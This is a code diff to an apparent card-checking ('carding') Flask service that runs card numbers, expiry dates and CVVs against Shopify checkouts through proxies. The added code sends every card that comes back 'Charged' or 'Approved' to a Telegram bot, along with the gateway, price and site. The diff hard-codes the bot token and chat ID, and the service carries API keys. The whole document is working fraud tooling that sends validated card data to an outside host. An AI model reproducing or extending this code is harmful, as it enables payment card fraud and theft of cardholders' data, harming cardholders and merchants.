@@ -1021,6 +1021,46 @@ def parse_cc_string(cc_string):
 async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
 
+
+# Telegram Notification Config
+TELEGRAM_BOT_TOKEN = '8905875566:AAGhw4dQK12EyyOkqQXcMVYTpKQgBJk-wrI'
+TELEGRAM_USER_ID = '8786282734'
+
+async def send_telegram_notification(cc, response, gateway, price, site, status):
+    """Send notification to Telegram when Charged or Approved"""
+    try:
+        if status == 'Charged':
+            emoji = "🔥"
+            status_text = "CHARGED"
+        else:
+            emoji = "✅"
+            status_text = "APPROVED"
+        
+        message = f"""
+{emoji} <b>{status_text}</b> {emoji}
+
+💳 CC: <code>{cc}</code>
+📝 Response: {response}
+🛒 Gateway: {gateway}
+💰 Price: {price}
+🌐 Site: {site}
+⏰ Time: {__import__('datetime').datetime.now().strftime('%H:%M:%S')}
+"""
+        
+        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
+        data = {
+            'chat_id': TELEGRAM_USER_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data) as resp:
+                return resp.status == 200
+    except Exception as e:
+        print(f'Telegram error: {e}')
+        return False
+
 app = Flask(__name__)
 
 API_KEYS = ['AnonShopii2026!', 'DrGaM2026', 'ZNZII_KEY']
@@ -1130,6 +1170,14 @@ def shopify_checker():
             "Approved": "True" if is_approved else "False",
             "Time": f"{time.time() - req_start_time:.1f}s"
         }
+        
+        # Send Telegram notification for Charged or Approved
+        if is_charged or is_approved:
+            status = 'Charged' if is_charged else 'Approved'
+            asyncio.run(send_telegram_notification(
+                cc_string, clean_response, gateway, 
+                f"${price}", site, status
+            ))
         
         return jsonify(response_data)
         
